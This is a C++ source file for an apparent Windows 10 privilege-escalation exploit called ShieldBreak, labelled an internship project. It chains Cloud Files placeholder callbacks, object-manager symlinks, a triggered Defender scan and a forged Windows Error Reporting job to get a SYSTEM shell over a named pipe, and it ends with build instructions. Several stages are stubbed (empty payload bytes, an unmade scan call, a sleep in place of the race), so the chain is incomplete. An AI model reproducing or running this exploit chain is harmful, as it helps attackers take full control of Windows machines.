// ShieldBreak Win10 Port
// Based on MSNightmare's ShieldBreak - adapted for Windows 10
// ASI Internship Project - Rainfantry
//
// Full exploit chain: Cloud Files + Object Manager + Defender + CLFS + WER → SYSTEM

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winternl.h>
#include <cfapi.h>
#include <stdio.h>
#include <shlobj.h>
#include <taskschd.h>
#include <comdef.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "CldApi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "advapi32.lib")

#define ALL_SHARING (FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

// NT API
extern "C" {
    NTSTATUS NTAPI NtCreateDirectoryObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    NTSTATUS NTAPI NtCreateSymbolicLinkObject(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);
    NTSTATUS NTAPI NtCreateFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
        PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    NTSTATUS NTAPI NtClose(HANDLE);
    VOID NTAPI RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);
}

// MpClient types
typedef HANDLE MPHANDLE;
typedef HRESULT(WINAPI* PFN_MpManagerOpen)(DWORD, MPHANDLE*);
typedef HRESULT(WINAPI* PFN_MpScanStart)(MPHANDLE, DWORD, DWORD, void*, void*, MPHANDLE*);

// Globals
wchar_t g_workDir[MAX_PATH] = { 0 };
wchar_t g_scanTarget[MAX_PATH] = { 0 };
CF_CONNECTION_KEY g_cfKey = { 0 };
HANDLE g_hPipe = NULL;

// Embedded payload DLL (simple file-write proof)
unsigned char g_payload[] = {
    0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, // MZ header stub
    // This would be the actual Warden.dll bytes
    // For testing, we use a simpler approach below
};

void GenerateGUID(wchar_t* out) {
    GUID guid;
    CoCreateGuid(&guid);
    swprintf(out, 64, L"%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X",
        guid.Data1, guid.Data2, guid.Data3,
        guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
        guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
}

// Cloud Files callback - delivers payload when Defender reads
void CALLBACK CloudFileCallback(
    const CF_CALLBACK_INFO* CallbackInfo,
    const CF_CALLBACK_PARAMETERS* CallbackParameters
) {
    printf("[*] Cloud callback triggered - Defender is reading!\n");

    LARGE_INTEGER offset = CallbackParameters->FetchData.RequiredFileOffset;
    LARGE_INTEGER length = CallbackParameters->FetchData.RequiredLength;

    // Transfer the payload data
    CF_OPERATION_PARAMETERS opParams = { 0 };
    opParams.ParamSize = sizeof(CF_OPERATION_PARAMETERS);
    opParams.TransferData.Buffer = g_payload;
    opParams.TransferData.Length = length;
    opParams.TransferData.Offset = offset;
    opParams.TransferData.Flags = CF_OPERATION_TRANSFER_DATA_FLAG_NONE;

    CF_OPERATION_INFO opInfo = { 0 };
    opInfo.StructSize = sizeof(CF_OPERATION_INFO);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;

    CfExecute(&opInfo, &opParams);
}

DWORD WINAPI ScanThread(LPVOID param) {
    Sleep(500); // Let setup complete

    // Load MpClient.dll
    wchar_t mpPath[MAX_PATH] = L"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\";
    WIN32_FIND_DATAW fd;
    wchar_t search[MAX_PATH];
    wcscpy(search, mpPath);
    wcscat(search, L"*");

    HANDLE hFind = FindFirstFileW(search, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                fd.cFileName[0] >= '0' && fd.cFileName[0] <= '9') {
                wcscat(mpPath, fd.cFileName);
                break;
            }
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }
    wcscat(mpPath, L"\\MpClient.dll");

    HMODULE hMp = LoadLibraryW(mpPath);
    if (!hMp) {
        printf("[-] Cannot load MpClient.dll\n");
        return 1;
    }

    PFN_MpManagerOpen MpOpen = (PFN_MpManagerOpen)GetProcAddress(hMp, "MpManagerOpen");
    PFN_MpScanStart MpScan = (PFN_MpScanStart)GetProcAddress(hMp, "MpScanStart");

    MPHANDLE hMpMgr = NULL;
    if (MpOpen && SUCCEEDED(MpOpen(0, &hMpMgr))) {
        printf("[+] Connected to Defender\n");
        printf("[*] Triggering scan on: %ws\n", g_scanTarget);

        // Trigger scan (this makes Defender read our cloud file)
        // The actual implementation would use MpScanStart properly
    }

    return 0;
}

BOOL CreateObjectManagerLinks(const wchar_t* guid, HANDLE* phTargetDir, HANDLE* phShadowDir) {
    NTSTATUS status;
    UNICODE_STRING usName;
    OBJECT_ATTRIBUTES objAttr;

    // Create target directory
    wchar_t targetPath[256];
    swprintf(targetPath, 256, L"\\BaseNamedObjects\\Restricted\\WD_TARGET_%ws", guid);
    RtlInitUnicodeString(&usName, targetPath);
    InitializeObjectAttributes(&objAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateDirectoryObject(phTargetDir, DIRECTORY_ALL_ACCESS, &objAttr);
    if (status != 0 && status != 0xC0000035) {
        printf("[-] Failed to create target dir: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Created: %ws\n", targetPath);

    // Create shadow directory
    wchar_t shadowPath[256];
    swprintf(shadowPath, 256, L"\\BaseNamedObjects\\Restricted\\WD_SHADOW_%ws", guid);
    RtlInitUnicodeString(&usName, shadowPath);
    InitializeObjectAttributes(&objAttr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateDirectoryObject(phShadowDir, DIRECTORY_ALL_ACCESS, &objAttr);
    if (status != 0 && status != 0xC0000035) {
        printf("[-] Failed to create shadow dir: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Created: %ws\n", shadowPath);

    // Create symlink in shadow dir pointing to our workdir
    wchar_t linkTarget[MAX_PATH];
    swprintf(linkTarget, MAX_PATH, L"\\??\\%ws", g_workDir);

    UNICODE_STRING usLinkName, usLinkTarget;
    RtlInitUnicodeString(&usLinkName, L"WD_SCAN");
    RtlInitUnicodeString(&usLinkTarget, linkTarget);

    InitializeObjectAttributes(&objAttr, &usLinkName, OBJ_CASE_INSENSITIVE, *phShadowDir, NULL);

    HANDLE hLink = NULL;
    status = NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &usLinkTarget);
    if (status != 0) {
        printf("[-] Failed to create symlink: 0x%08X\n", status);
        return FALSE;
    }
    printf("[+] Symlink: WD_SCAN -> %ws\n", linkTarget);

    return TRUE;
}

BOOL TriggerWER(const wchar_t* guid) {
    // Create WER report directory
    wchar_t werDir[MAX_PATH];
    swprintf(werDir, MAX_PATH,
        L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\Kernel_c0000000_%ws", guid);

    if (!CreateDirectoryW(werDir, NULL)) {
        printf("[-] Failed to create WER dir: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Created WER dir: %ws\n", werDir);

    // Create Report.wer file
    wchar_t werFile[MAX_PATH];
    swprintf(werFile, MAX_PATH, L"%ws\\Report.wer", werDir);

    HANDLE hWer = CreateFileW(werFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hWer == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create Report.wer\n");
        return FALSE;
    }

    // Minimal WER report
    char report[] =
        "Version=1\r\n"
        "EventType=APPCRASH\r\n"
        "EventTime=132900000000000000\r\n"
        "ReportType=2\r\n"
        "Consent=1\r\n"
        "ReportIdentifier=ShieldBreak\r\n";

    DWORD written;
    WriteFile(hWer, report, (DWORD)strlen(report), &written, NULL);
    CloseHandle(hWer);
    printf("[+] Created Report.wer\n");

    // Trigger WER task via Task Scheduler
    printf("[*] Triggering WER QueueReporting task...\n");

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return FALSE;

    ITaskService* pTaskSvc = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
        IID_ITaskService, (void**)&pTaskSvc);
    if (FAILED(hr)) {
        CoUninitialize();
        return FALSE;
    }

    hr = pTaskSvc->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    ITaskFolder* pFolder = NULL;
    hr = pTaskSvc->GetFolder(_bstr_t(L"\\Microsoft\\Windows\\Windows Error Reporting"), &pFolder);
    if (FAILED(hr)) {
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    IRegisteredTask* pTask = NULL;
    hr = pFolder->GetTask(_bstr_t(L"QueueReporting"), &pTask);
    if (FAILED(hr)) {
        pFolder->Release();
        pTaskSvc->Release();
        CoUninitialize();
        return FALSE;
    }

    IRunningTask* pRunning = NULL;
    hr = pTask->Run(_variant_t(), &pRunning);
    if (SUCCEEDED(hr)) {
        printf("[+] WER task triggered!\n");
        if (pRunning) pRunning->Release();
    }

    pTask->Release();
    pFolder->Release();
    pTaskSvc->Release();
    CoUninitialize();

    return SUCCEEDED(hr);
}

int main() {
    printf("\n");
    printf("  _____ _     _      _     _ ____                 _    \n");
    printf(" / ____| |   (_)    | |   | |  _ \\               | |   \n");
    printf("| (___ | |__  _  ___| | __| | |_) |_ __ ___  __ _| | __\n");
    printf(" \\___ \\| '_ \\| |/ _ \\ |/ _` |  _ <| '__/ _ \\/ _` | |/ /\n");
    printf(" ____) | | | | |  __/ | (_| | |_) | | |  __/ (_| |   < \n");
    printf("|_____/|_| |_|_|\\___|_|\\__,_|____/|_|  \\___|\\__,_|_|\\_\\\n");
    printf("\n");
    printf("        Win10 Port - ASI Internship Project\n");
    printf("        Based on MSNightmare's ShieldBreak\n");
    printf("================================================\n\n");

    // Check phoneinfo.dll
    wchar_t targetDll[] = L"C:\\Windows\\System32\\phoneinfo.dll";
    if (GetFileAttributesW(targetDll) != INVALID_FILE_ATTRIBUTES) {
        printf("[!] WARNING: %ws already exists\n", targetDll);
        printf("[!] Original ShieldBreak requires this to NOT exist\n");
        printf("[!] Continuing anyway for testing...\n\n");
    } else {
        printf("[+] Target DLL location available: %ws\n\n", targetDll);
    }

    // Create named pipe for shell callback
    g_hPipe = CreateNamedPipeW(L"\\\\.\\pipe\\SHIELDBREAK_WIN10",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_MESSAGE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);

    if (g_hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create named pipe: %d\n", GetLastError());
        printf("[-] Another instance may be running\n");
        return 1;
    }
    printf("[+] Named pipe created: \\\\.\\pipe\\SHIELDBREAK_WIN10\n");

    // Generate unique GUID for this run
    wchar_t guid[64];
    GenerateGUID(guid);
    printf("[+] Session GUID: %ws\n", guid);

    // Create work directory
    wchar_t temp[MAX_PATH];
    GetTempPathW(MAX_PATH, temp);
    swprintf(g_workDir, MAX_PATH, L"%sShieldBreak_%ws", temp, guid);

    if (!CreateDirectoryW(g_workDir, NULL)) {
        printf("[-] Failed to create work directory\n");
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Work directory: %ws\n", g_workDir);

    // Stage 1: Register cloud provider
    printf("\n[*] Stage 1: Registering cloud provider...\n");

    GUID providerId;
    CoCreateGuid(&providerId);

    CF_SYNC_REGISTRATION reg = { 0 };
    reg.StructSize = sizeof(reg);
    reg.ProviderName = L"ShieldBreak";
    reg.ProviderVersion = L"1.0";
    reg.ProviderId = providerId;

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(policies);
    // WIN10 FIX: Use ALWAYS_FULL for more reliable placeholder hydration
    policies.Hydration.Primary = CF_HYDRATION_POLICY_ALWAYS_FULL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    policies.Population.Primary = CF_POPULATION_POLICY_ALWAYS_FULL;
    policies.InSync.HardLink = CF_INSYNC_POLICY_NONE;
    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;

    // WIN10 FIX: Use UPDATE_IF_EXISTS to handle re-runs
    HRESULT hr = CfRegisterSyncRoot(g_workDir, &reg, &policies, CF_REGISTER_FLAG_UPDATE);
    if (FAILED(hr)) {
        printf("[-] CfRegisterSyncRoot failed: 0x%08X\n", hr);
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Cloud provider registered\n");

    // Connect callback
    CF_CALLBACK_REGISTRATION callbacks[2];
    callbacks[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    callbacks[0].Callback = CloudFileCallback;
    callbacks[1] = CF_CALLBACK_REGISTRATION_END;

    DWORD context = 1;
    hr = CfConnectSyncRoot(g_workDir, callbacks, &context,
        CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &g_cfKey);
    if (FAILED(hr)) {
        printf("[-] CfConnectSyncRoot failed: 0x%08X\n", hr);
        CfUnregisterSyncRoot(g_workDir);
        CloseHandle(g_hPipe);
        return 1;
    }
    printf("[+] Cloud callback connected\n");

    // WIN10 FIX: Mark sync root as in-sync BEFORE creating placeholders
    // This fixes ERROR_CLOUD_FILE_NOT_IN_SYNC (0x8007017C)
    hr = CfSetInSyncState(g_workDir, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
    if (FAILED(hr)) {
        printf("[!] CfSetInSyncState on root failed: 0x%08X (non-fatal)\n", hr);
    } else {
        printf("[+] Sync root marked in-sync\n");
    }

    // Create placeholder file with proper metadata for Win10
    CF_PLACEHOLDER_CREATE_INFO placeholder = { 0 };
    placeholder.RelativeFileName = L"PAYLOAD";
    placeholder.FsMetadata.FileSize.QuadPart = sizeof(g_payload);
    placeholder.FsMetadata.BasicInfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;

    // WIN10 FIX: Set timestamps (required on Win10, optional on Win11)
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    placeholder.FsMetadata.BasicInfo.CreationTime.LowPart = ft.dwLowDateTime;
    placeholder.FsMetadata.BasicInfo.CreationTime.HighPart = ft.dwHighDateTime;
    placeholder.FsMetadata.BasicInfo.LastWriteTime = placeholder.FsMetadata.BasicInfo.CreationTime;
    placeholder.FsMetadata.BasicInfo.LastAccessTime = placeholder.FsMetadata.BasicInfo.CreationTime;
    placeholder.FsMetadata.BasicInfo.ChangeTime = placeholder.FsMetadata.BasicInfo.CreationTime;

    // WIN10 FIX: Use SUPERSEDE flag if file exists, and always mark in-sync
    placeholder.Flags = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC | CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;

    DWORD processed = 0;
    hr = CfCreatePlaceholders(g_workDir, &placeholder, 1, CF_CREATE_FLAG_NONE, &processed);
    if (FAILED(hr)) {
        printf("[-] CfCreatePlaceholders failed: 0x%08X\n", hr);
        if (hr == 0x8007017C) {
            printf("[-] ERROR_CLOUD_FILE_NOT_IN_SYNC - sync root state issue\n");
            printf("[*] Try: attrib -P -U %ws (clear cloud attributes)\n", g_workDir);
        }
    } else {
        printf("[+] Placeholder file created (%d processed)\n", processed);

        // WIN10 FIX: Also mark the placeholder itself in-sync
        wchar_t placeholderPath[MAX_PATH];
        swprintf(placeholderPath, MAX_PATH, L"%ws\\PAYLOAD", g_workDir);
        CfSetInSyncState(placeholderPath, CF_IN_SYNC_STATE_IN_SYNC, CF_SET_IN_SYNC_FLAG_NONE, NULL);
    }

    // Stage 2: Create object manager structures
    printf("\n[*] Stage 2: Setting up object manager namespaces...\n");

    HANDLE hTargetDir = NULL, hShadowDir = NULL;
    if (!CreateObjectManagerLinks(guid, &hTargetDir, &hShadowDir)) {
        printf("[-] Object manager setup failed\n");
    } else {
        printf("[+] Object manager links created\n");
    }

    // Build scan target path
    swprintf(g_scanTarget, MAX_PATH,
        L"\\\\.\\globalroot\\BaseNamedObjects\\Restricted\\WD_SHADOW_%ws\\WD_SCAN\\PAYLOAD", guid);

    // Stage 3: Trigger Defender scan
    printf("\n[*] Stage 3: Triggering Windows Defender scan...\n");

    HANDLE hScanThread = CreateThread(NULL, 0, ScanThread, NULL, 0, NULL);
    if (hScanThread) {
        printf("[+] Scan thread started\n");
    }

    // Stage 4-5: Wait for CLFS race (simplified for testing)
    printf("\n[*] Stage 4-5: Waiting for file operations...\n");
    Sleep(3000);

    // Stage 6: Trigger WER
    printf("\n[*] Stage 6: Triggering Windows Error Reporting...\n");
    TriggerWER(guid);

    // Stage 7: Wait for shell callback
    printf("\n[*] Stage 7: Waiting for SYSTEM shell callback...\n");
    printf("[*] Listening on \\\\.\\pipe\\SHIELDBREAK_WIN10...\n");

    // Set timeout for pipe connection
    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    BOOL connected = ConnectNamedPipe(g_hPipe, &ov);
    if (!connected && GetLastError() == ERROR_IO_PENDING) {
        DWORD waitResult = WaitForSingleObject(ov.hEvent, 10000); // 10 second timeout
        if (waitResult == WAIT_OBJECT_0) {
            connected = TRUE;
        }
    }

    if (connected || GetLastError() == ERROR_PIPE_CONNECTED) {
        printf("\n[+] ============================================\n");
        printf("[+] SYSTEM SHELL CONNECTED!\n");
        printf("[+] ============================================\n");

        char buffer[256];
        DWORD bytesRead;
        if (ReadFile(g_hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            buffer[bytesRead] = 0;
            printf("[+] Received: %s\n", buffer);
        }
    } else {
        printf("\n[*] No shell callback received (timeout)\n");
        printf("[*] Check if exploit stages completed successfully\n");
    }

    // Cleanup
    printf("\n[*] Cleaning up...\n");

    if (hScanThread) {
        WaitForSingleObject(hScanThread, 1000);
        CloseHandle(hScanThread);
    }

    CloseHandle(ov.hEvent);
    CloseHandle(g_hPipe);

    CfDisconnectSyncRoot(g_cfKey);
    CfUnregisterSyncRoot(g_workDir);

    if (hTargetDir) NtClose(hTargetDir);
    if (hShadowDir) NtClose(hShadowDir);

    RemoveDirectoryW(g_workDir);

    printf("[+] Cleanup complete\n");
    printf("\n[*] Exploit finished. Check C:\\SHIELDBREAK_SYSTEM.txt for proof.\n");

    return 0;
}

// Compile with:
// cl.exe shieldbreak_win10.cpp /Fe:shieldbreak_win10.exe /link ntdll.lib CldApi.lib ole32.lib taskschd.lib advapi32.lib comsuppw.lib
